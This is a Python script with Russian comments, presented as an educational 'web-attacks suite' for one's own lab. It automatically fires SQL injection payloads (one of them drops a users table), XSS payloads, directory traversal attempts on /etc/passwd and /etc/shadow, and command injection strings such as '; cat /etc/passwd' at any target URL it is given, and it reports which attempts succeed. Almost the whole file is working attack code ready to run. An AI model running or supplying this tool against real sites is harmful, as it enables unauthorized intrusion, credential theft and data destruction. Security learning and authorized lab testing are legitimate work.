#!/usr/bin/env python3
"""
Комплексный набор инструментов для веб-атак
ВНИМАНИЕ: Только для использования в собственной лабораторной среде!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import requests
import sys
import time
import argparse
import re
import urllib.parse
from bs4 import BeautifulSoup

class WebAttacksSuite:
    """
    Комплексный набор инструментов для веб-атак
    """
    
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities_found = []
        
    def check_target_accessibility(self):
        """
        Проверка доступности цели
        """
        print(f"🔍 Проверяем доступность {self.target_url}")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code == 200:
                print("✅ Цель доступна")
                return True
            else:
                print(f"❌ Цель недоступна (код: {response.status_code})")
                return False
        except Exception as e:
            print(f"❌ Ошибка подключения: {e}")
            return False
    
    def sql_injection_attack(self, login_url=None):
        """
        SQL Injection атака
        """
        print("\n" + "="*60)
        print("💉 SQL INJECTION АТАКА")
        print("="*60)
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT NULL, NULL, NULL --",
            "admin'--",
            "admin' #",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1 --",
            "'; DROP TABLE users; --",
            "' OR '1'='1' AND '1'='1",
            "1' OR '1'='1",
            "admin' OR '1'='1' --",
            "') OR ('1'='1",
            "1' OR 1=1 --",
            "1' OR 1=1 #",
            "' OR '1'='1' /*"
        ]
        
        # Тестируем различные URL
        test_urls = [
            f"{self.target_url}/login.php",
            f"{self.target_url}/login",
            f"{self.target_url}/user.php",
            f"{self.target_url}/search.php",
            f"{self.target_url}/index.php",
            f"{self.target_url}/admin/login.php"
        ]
        
        if login_url:
            test_urls = [login_url]
        
        for url in test_urls:
            print(f"\n🎯 Тестируем SQL injection на {url}")
            
            # Тестируем GET параметры
            self._test_sql_injection_get(url, sql_payloads)
            
            # Тестируем POST параметры
            self._test_sql_injection_post(url, sql_payloads)
    
    def _test_sql_injection_get(self, url, payloads):
        """
        Тестирование SQL injection через GET параметры
        """
        # Общие параметры для тестирования
        test_params = ['id', 'user', 'username', 'search', 'q', 'query', 'page', 'cat', 'category']
        
        for param in test_params:
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_sql_injection_success(response, payload):
                        print(f"🎉 SQL injection найден!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _test_sql_injection_post(self, url, payloads):
        """
        Тестирование SQL injection через POST параметры
        """
        # Тестовые данные для POST
        test_data = {
            'username': 'admin',
            'password': 'password',
            'user': 'admin',
            'pass': 'password',
            'login': 'admin',
            'pwd': 'password'
        }
        
        for payload in payloads:
            for field in ['username', 'user', 'login']:
                try:
                    data = test_data.copy()
                    data[field] = payload
                    
                    response = self.session.post(url, data=data, timeout=5)
                    
                    if self._detect_sql_injection_success(response, payload):
                        print(f"🎉 SQL injection найден!")
                        print(f"   URL: {url}")
                        print(f"   Field: {field}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'field': field,
                            'payload': payload,
                            'method': 'POST'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_sql_injection_success(self, response, payload):
        """
        Детекция успешной SQL injection
        """
        # Индикаторы успешной SQL injection
        success_indicators = [
            'welcome',
            'login successful',
            'dashboard',
            'admin panel',
            'user logged in',
            'mysql_fetch_array',
            'mysql_num_rows',
            'sql syntax',
            'mysql error',
            'warning: mysql',
            'valid user',
            'access granted'
        ]
        
        error_indicators = [
            'mysql_fetch_array',
            'mysql_num_rows',
            'mysql error',
            'sql syntax',
            'warning: mysql',
            'sqlstate',
            'database error'
        ]
        
        response_text = response.text.lower()
        
        # Проверяем на успешный вход
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        # Проверяем на ошибки базы данных
        for indicator in error_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def xss_attack(self):
        """
        XSS (Cross-Site Scripting) атака
        """
        print("\n" + "="*60)
        print("🌐 XSS (CROSS-SITE SCRIPTING) АТАКА")
        print("="*60)
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "javascript:alert('XSS')",
            "vbscript:alert('XSS')",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>"
        ]
        
        # Тестируем различные URL
        test_urls = [
            f"{self.target_url}/search.php",
            f"{self.target_url}/comment.php",
            f"{self.target_url}/contact.php",
            f"{self.target_url}/feedback.php",
            f"{self.target_url}/guestbook.php",
            f"{self.target_url}/index.php"
        ]
        
        for url in test_urls:
            print(f"\n🎯 Тестируем XSS на {url}")
            
            # Тестируем GET параметры
            self._test_xss_get(url, xss_payloads)
            
            # Тестируем POST параметры
            self._test_xss_post(url, xss_payloads)
    
    def _test_xss_get(self, url, payloads):
        """
        Тестирование XSS через GET параметры
        """
        test_params = ['q', 'search', 'query', 'name', 'message', 'comment', 'feedback']
        
        for param in test_params:
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_xss_success(response, payload):
                        print(f"🎉 XSS уязвимость найдена!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'XSS',
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _test_xss_post(self, url, payloads):
        """
        Тестирование XSS через POST параметры
        """
        test_data = {
            'name': 'test',
            'message': 'test message',
            'comment': 'test comment',
            'feedback': 'test feedback',
            'email': 'test@test.com'
        }
        
        for payload in payloads:
            for field in ['name', 'message', 'comment', 'feedback']:
                try:
                    data = test_data.copy()
                    data[field] = payload
                    
                    response = self.session.post(url, data=data, timeout=5)
                    
                    if self._detect_xss_success(response, payload):
                        print(f"🎉 XSS уязвимость найдена!")
                        print(f"   URL: {url}")
                        print(f"   Field: {field}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'XSS',
                            'url': url,
                            'field': field,
                            'payload': payload,
                            'method': 'POST'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_xss_success(self, response, payload):
        """
        Детекция успешной XSS атаки
        """
        # Проверяем, отражен ли payload в ответе
        if payload in response.text:
            return True
        
        # Проверяем на наличие script тегов
        if '<script>' in response.text and 'alert' in response.text:
            return True
        
        return False
    
    def directory_traversal_attack(self):
        """
        Directory Traversal атака
        """
        print("\n" + "="*60)
        print("📁 DIRECTORY TRAVERSAL АТАКА")
        print("="*60)
        
        # Directory traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/motd",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
            "c:\\windows\\system32\\drivers\\etc\\hosts",
            "c:\\boot.ini",
            "c:\\windows\\win.ini"
        ]
        
        # Тестируем различные параметры
        test_params = ['file', 'path', 'page', 'include', 'doc', 'document', 'filename', 'path']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    test_url = f"{self.target_url}/index.php?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_directory_traversal_success(response):
                        print(f"🎉 Directory Traversal найден!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'Directory Traversal',
                            'url': test_url,
                            'payload': payload
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_directory_traversal_success(self, response):
        """
        Детекция успешной Directory Traversal атаки
        """
        # Индикаторы успешного чтения файлов
        success_indicators = [
            'root:x:0:0:',
            '[boot loader]',
            'Microsoft Windows',
            'kernel version',
            'processor',
            'memtotal:',
            'localhost'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator.lower() in response_text:
                return True
        
        return False
    
    def command_injection_attack(self):
        """
        Command Injection атака
        """
        print("\n" + "="*60)
        print("⚡ COMMAND INJECTION АТАКА")
        print("="*60)
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
            "; id",
            "| id",
            "&& id",
            "; uname -a",
            "| uname -a",
            "&& uname -a",
            "; pwd",
            "| pwd",
            "&& pwd",
            "; ps aux",
            "| ps aux",
            "&& ps aux"
        ]
        
        # Тестируем различные параметры
        test_params = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip', 'domain']
        
        for param in test_params:
            for payload in cmd_payloads:
                try:
                    test_url = f"{self.target_url}/index.php?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_command_injection_success(response):
                        print(f"🎉 Command Injection найден!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'payload': payload
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_command_injection_success(self, response):
        """
        Детекция успешной Command Injection атаки
        """
        # Индикаторы успешного выполнения команд
        success_indicators = [
            'total ',
            'drwx',
            'root:x:0:0:',
            'uid=',
            'gid=',
            'linux',
            'darwin',
            'microsoft',
            '/bin/bash',
            '/usr/bin',
            '/var/www',
            'apache',
            'nginx',
            'mysql',
            'postgres'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def run_full_web_attack(self):
        """
        Запуск полного набора веб-атак
        """
        print("🌐 КОМПЛЕКСНЫЕ ВЕБ-АТАКИ")
        print("="*60)
        print("⚠️  ВНИМАНИЕ: Только для собственной лабораторной среды!")
        print("="*60)
        
        if not self.check_target_accessibility():
            return False
        
        start_time = time.time()
        
        try:
            # Выполняем все типы атак
            self.sql_injection_attack()
            self.xss_attack()
            self.directory_traversal_attack()
            self.command_injection_attack()
            
            # Финальная статистика
            end_time = time.time()
            duration = end_time - start_time
            
            print(f"\n🏁 ВЕБ-АТАКИ ЗАВЕРШЕНЫ")
            print(f"⏱️  Общее время: {duration:.1f} секунд")
            print(f"🎯 Найдено уязвимостей: {len(self.vulnerabilities_found)}")
            
            if self.vulnerabilities_found:
                print(f"\n📋 НАЙДЕННЫЕ УЯЗВИМОСТИ:")
                for vuln in self.vulnerabilities_found:
                    print(f"  🚨 {vuln['type']}: {vuln['url']}")
            else:
                print(f"\n✅ Критических уязвимостей не найдено")
            
            print(f"\n📚 ОБРАЗОВАТЕЛЬНАЯ ЦЕННОСТЬ:")
            print("  • Изучены основные веб-уязвимости")
            print("  • Понимание методов атак и защиты")
            print("  • Практический опыт тестирования веб-безопасности")
            
        except KeyboardInterrupt:
            print("\n🛑 Веб-атаки прерваны пользователем")
        except Exception as e:
            print(f"\n❌ Критическая ошибка: {e}")

def main():
    """
    Главная функция веб-атак
    """
    parser = argparse.ArgumentParser(description='Комплексные веб-атаки')
    parser.add_argument('target', help='URL цели (например, http://10.211.55.14)')
    parser.add_argument('--sql', action='store_true', help='Только SQL injection')
    parser.add_argument('--xss', action='store_true', help='Только XSS')
    parser.add_argument('--traversal', action='store_true', help='Только Directory Traversal')
    parser.add_argument('--cmd', action='store_true', help='Только Command Injection')
    
    args = parser.parse_args()
    
    # Создаем экземпляр веб-атак
    web_attacks = WebAttacksSuite(args.target)
    
    try:
        if args.sql:
            web_attacks.sql_injection_attack()
        elif args.xss:
            web_attacks.xss_attack()
        elif args.traversal:
            web_attacks.directory_traversal_attack()
        elif args.cmd:
            web_attacks.command_injection_attack()
        else:
            # Полный набор атак
            web_attacks.run_full_web_attack()
            
    except KeyboardInterrupt:
        print("\n🛑 Веб-атаки прерваны пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")

if __name__ == "__main__":
    main()
